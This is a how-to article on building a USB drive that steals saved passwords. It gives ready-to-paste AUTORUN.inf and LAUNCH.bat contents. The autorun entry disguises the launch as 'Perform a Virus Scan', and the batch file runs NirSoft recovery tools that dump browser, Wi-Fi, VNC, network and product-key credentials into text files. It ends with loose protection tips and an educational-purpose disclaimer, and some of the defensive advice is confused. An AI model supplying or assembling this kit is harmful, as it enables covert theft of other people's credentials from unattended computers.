Steps to Create a Hacker USB Flash Drive

Create a new Notepad (TXT) file, then paste the code below into it:

text
[autorun]
open=launch.bat
ACTION=Perform a Virus Scan
Then, save it with the format: AUTORUN.inf

Create another new Notepad (TXT) file, and paste the code below into it:

text
Dialupass.exe /stext Dialupass.txt
netpass.exe /stext netpass.txt
WirelessKeyView.exe /stext WirelessKeyView.txt
BulletsPassView.exe /stext BulletsPassView.txt
VNCPassView.exe /stext VNCPassView.txt
OpenedFilesView.exe /stext OpenedFilesView.txt
ProduKey.exe /stext ProduKey.txt
USBDeview.exe /stext USBDeview.txt
WebBrowserPassView.exe /stext WebBrowserPassView.txt
ChromePass.exe /stext ChromePass.txt
Then, save it with the format: LAUNCH.bat
(These codes correspond to small programs you will need to download).

Finally, copy the two files AUTORUN.inf and LAUNCH.bat to the USB flash drive.

Next, download the specific password recovery tool you want from the following link:
https://www.nirsoft.net/password_recovery_tools.html

Download all the programs listed in the LAUNCH.bat file from the website.

After downloading the programs and extracting them, copy all their files and paste them into the USB flash drive along with the two previous files.

We have finished creating the hacker USB flash drive that extracts all the passwords you have used on the computer.

When you plug the USB flash drive into the computer's USB port, run the LAUNCH.bat file. The program will then create a TXT file with the same name as the program used to extract the passwords.

To view these passwords, you can open the new TXT file, and they will appear as a list containing all the passwords organized by username, password, and website name.

But how do I protect myself?!

If we talk realistically about how to protect yourself from this method, especially since a large number of users might start exploiting it, it's by following these steps:

First: The primary step for protection is to be cautious about the USB flash drives you connect to your computer. Since the method relies solely on a USB flash drive to obtain your passwords, this previous step alone isn't sufficient to protect your passwords. Therefore, I also recommend disabling the USB ports on your device to protect your computer from any USB flash drive being connected in your absence.

Second: Do not leave your computer or laptop unattended with anyone. If you need to let someone use your computer, stay nearby or close to them so you can notice if they use any USB drive to steal your passwords or not.

Third: Show hidden files. The method used relies on hiding some files and then transferring them to the USB flash drive. Therefore, if you find it necessary to connect someone else's USB flash drive to your computer, I advise you to show hidden files so you can see if there are any hidden files inside the USB drive. If you find any hidden files, the best solution is to delete those files immediately to get rid of any passwords they might have obtained. The method to show hidden files is very simple: Go to Control Panel, then Folder Options. A new window will appear; go to the second tab and select the option Show hidden files, folders, and drives. This way, you will be able to see the hidden files on the USB flash drive.

Fourth: Delete saved passwords in the browser. The final step you can take to protect your accounts is to delete all passwords saved in your browser. This will render the method ineffective for you. To do this, go to the browser you use frequently that contains your saved passwords, then go to Settings, then Manage passwords or similar, and finally remove all the passwords you have saved in the browser.

Note: The instructions above describe a potential security threat for educational purposes regarding how such an attack might be constructed. Using such methods to access systems without explicit permission is illegal and unethical. The protection advice is crucial for enhancing personal cybersecurity. Always ensure you have proper authorization before testing any security tools on systems you do not own.
